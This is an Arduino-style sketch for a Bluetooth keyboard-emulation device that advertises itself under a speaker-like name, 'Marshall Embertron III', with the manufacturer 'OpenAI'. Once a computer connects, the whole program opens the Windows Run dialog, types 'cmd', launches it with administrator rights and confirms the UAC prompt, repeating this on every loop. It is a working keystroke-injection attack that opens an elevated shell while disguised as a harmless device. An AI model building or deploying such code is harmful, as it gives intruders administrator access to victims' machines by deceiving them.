#include <BleKeyboard.h>

BleKeyboard bleKeyboard("Marshall Embertron III", "OpenAI", 100);
bool Done = true;


void setup() {
  bleKeyboard.begin();
}

void run(uint8_t mod,uint8_t key){
  bleKeyboard.press(mod);
  delay(20);
  bleKeyboard.press(key);
  delay(40);
  bleKeyboard.releaseAll();
  delay(150);
}

void elevate(){
  bleKeyboard.press(KEY_LEFT_CTRL);
  bleKeyboard.press(KEY_LEFT_SHIFT);
  bleKeyboard.press(KEY_RETURN);
  delay(50);
  bleKeyboard.releaseAll();
}


void loop() {
  if(bleKeyboard.isConnected() && Done){
    delay(1000);
    run(KEY_LEFT_GUI, 'r');
    delay(10);
    bleKeyboard.print("cmd");
    delay(100);
    elevate();
    delay(1500);
    bleKeyboard.write(KEY_LEFT_ARROW);
    bleKeyboard.write(KEY_RETURN);
  }
}
